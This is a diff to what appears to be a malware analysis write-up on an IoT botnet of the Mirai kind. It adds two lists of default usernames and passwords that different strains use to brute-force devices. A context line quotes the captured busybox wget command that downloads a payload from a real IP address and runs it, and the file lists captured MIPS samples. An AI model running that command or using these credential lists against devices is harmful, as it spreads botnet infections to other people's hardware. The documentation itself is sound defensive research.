@@ -22,6 +22,85 @@ sh
 /bin/busybox wget -O - http://85.118.98.197:61050/cyka/blyat/2.mp > /var/run/oMNUckLhyt && /bin/busybox WOPBOT
 ```
 
+### Brute-force credentials
+```
+root:xc3511
+guest:guest
+guest:12345
+root:root
+root:admin
+root:realtek
+root:1234
+root:12345
+root:123456
+root:1111
+root:password
+root:dreambox
+root:vizxv
+root:7ujMko0vizxv
+root:7ujMko0admin
+root:pass
+root:system
+admin:admin
+admin:7ujMko0admin
+admin:password
+admin:1111111
+admin:1234
+admin:12345
+admin:123456
+admin:1111
+admin:smcadmin
+admin:4321
+admin:pass
+support:support
+ubnt:ubnt
+888888:888888
+service:service
+```
+
+and (in other strain):
+
+```
+guest:guest
+guest:12345
+root:root
+root:admin
+root:1234
+root:12345
+root:123456
+root:1111
+root:password
+root:dreambox
+root:vizxv
+root:7ujMko0vizxv
+root:7ujMko0admin
+root:system
+root:ikwb
+root:pass
+root:system
+root:xc3511
+admin:admin
+admin:7ujMko0admin
+admin:password
+admin:1111111
+admin:1234
+admin:12345
+admin:123456
+admin:1111
+admin:smcadmin
+admin:4321
+admin:pass
+admin:meinsm
+support:support
+ubnt:ubnt
+666666:666666
+888888:888888
+service:service
+admin1:password
+administrator:1234
+supervisor:supervisor
+```
+
 ### Captured samples
 * [1.mp](samples/1.mp.7z) (`ELF 32-bit, MIPS-I, MD5: eab8da47ff36cafd2662fd01b6959389`)
 * [2.mp](samples/2_2.mp.7z) (`ELF 32-bit, MIPS-I, MD5: 78446a24075294968d1f48e76323665c`)
